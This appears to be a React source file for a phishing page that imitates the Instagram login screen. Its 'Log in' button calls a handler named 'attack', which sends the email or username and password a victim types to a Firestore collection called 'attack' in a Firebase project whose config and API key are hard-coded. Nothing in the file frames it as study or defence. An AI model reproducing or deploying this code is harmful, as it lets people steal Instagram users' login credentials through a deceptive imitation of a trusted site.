import "./App.css";
import { useState } from "react";
import instaMobileApp from "./images/instamobile.png";
import loginFB from "./images/loginFB.png";
import play from "./images/play.png";
import microsoft from "./images/microsoft.png";
import foot from "./images/foot.png";
import { initializeApp } from "firebase/app";
import { collection, addDoc } from "firebase/firestore";
import { getFirestore } from "firebase/firestore";

function App() {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();

  const firebaseConfig = {
    apiKey: "AIzaSyDZY1bEEg9NWDfaJXs-fSRlL6cpHMFurfU",
    authDomain: "instagram-login-cd0fc.firebaseapp.com",
    projectId: "instagram-login-cd0fc",
    storageBucket: "instagram-login-cd0fc.appspot.com",
    messagingSenderId: "669619895003",
    appId: "1:669619895003:web:346a9e3e321fcdc38beafe",
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  const attack = async (e) => {
    e.preventDefault();

    try {
      const docRef = await addDoc(collection(db, "attack"), {
        email: email,
        password: password,
      });
      // console.log("Document written with ID: ", docRef.id);
      setEmail("");
      setPassword("");
    } catch (e) {
      console.error("Error adding document: ", e);
    }
  };

  return (
    <div className="App">
      <div className="container">
        <div className="head">
          <div className="left">
            <img src={instaMobileApp} alt="" />
          </div>
          <div className="right">
            <div className="top">
              <div className="logo">
                <div class="heading"></div>
              </div>
              <div className="form">
                <div className="inputs">
                  <div className="form_input">
                    <input
                      type="text"
                      placeholder="Phone number, username, or email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  <div className="form_input">
                    <input
                      type="password"
                      placeholder="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                  </div>
                </div>
                <button onClick={attack}>Log in</button>
              </div>
              <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
              </div>
              <div className="loginWithFB">
                <img src={loginFB} alt="" />
                <p>
                  <span>Forgot password?</span>
                </p>
              </div>
            </div>
            <div className="middle">
              <p>
                Don't have an account? <span>Sign up</span>
              </p>
            </div>
            <div className="bottom">
              <p>
                <span>Get the app</span>
              </p>
              <div className="getOnapp">
                <img src={play} alt="" />
                <img src={microsoft} alt="" />
              </div>
            </div>
          </div>
        </div>
        <div className="foot">
          <img src={foot} alt="" />
        </div>
      </div>
    </div>
  );
}

export default App;
